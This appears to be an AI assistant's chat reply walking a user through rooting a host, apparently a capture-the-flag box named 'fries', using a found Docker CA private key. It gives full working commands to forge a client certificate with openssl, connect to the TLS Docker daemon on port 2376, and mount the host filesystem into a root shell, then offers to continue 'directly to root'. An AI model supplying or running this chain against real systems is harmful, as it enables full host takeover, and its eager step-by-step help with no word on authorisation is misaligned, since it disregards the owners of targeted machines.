If you found:
- `ca.pem`  
- `ca-key.pem`

Check the Docker daemon _is running with TLS client verification enabled_, and it's configured to trust certificates signed by **the CA whose private key you have**:

```sh
grep -R "tls" -n /etc 2>/dev/null
/etc/systemd/system/docker.service
 --tlsverify
 --tlscacert=/etc/docker/certs/ca.pem
 --tlscert=/etc/docker/certs/server-cert.pem
 --tlskey=/etc/docker/certs/server-key.pem
```

This means:
### 📌 You do NOT authenticate to a _container_
You authenticate to the **Docker daemon itself**, just like the root user.
Once authenticated, you get **full control over Docker**, which means:
- Create new containers
- Read/write host filesystem
- Mount `/`
- Escape to full root shell

**This is a full host compromise path.**

---

### 🚀 Exploitation path (use your CA private key → generate client cert → root)

Because you possess:

✔ `ca.pem`  
✔ `ca-key.pem`

You can generate a _trusted client certificate_:

```bash
openssl genrsa -out client.key 2048

openssl req -new -key client.key -subj "/CN=root" -out client.csr

openssl x509 -req -in client.csr \
  -CA /etc/docker/certs/ca.pem \
  -CAkey /etc/docker/certs/ca-key.pem \
  -CAcreateserial \
  -out client.crt \
  -days 365
```

Now you have:

```
client.crt
client.key
ca.pem
```

---

### 🔥 Connect to Docker daemon with full privileges

If Docker is exposed (likely on 2376 or via socket):

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=client.crt \
  --tlskey=client.key \
  -H tcp://<TARGET_IP>:2376 ps
```

If successful → you own Docker.

---

### 🏆 Root the box via Docker privilege escalation

Run container as root and mount filesystem:

```bash
docker --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=client.crt \
  --tlskey=client.key \
  -H tcp://<TARGET_IP>:2376 run -v /:/host -it alpine chroot /host sh
```

Boom:

```
root@fries:~# id
uid=0(root) gid=0(root)
```

You now have **system root access on the host machine.**

---

### Summary

|What you found|What it means|
|---|---|
|You have CA private key|You can forge trusted certs|
|Docker is configured with TLS client verification|Only signed certs can control Docker|
|You can forge signed certs|You bypass authentication|
|Access to Docker daemon|!!! Full system root access !!!|

---

If you want, tell me:

**What is the port Docker listens on?**

Run:

```bash
sudo ss -ltnp | grep docker
```

(or without sudo if you have no rights — still might work)

Once we know the port, I’ll walk you directly to root in two commands. 🚀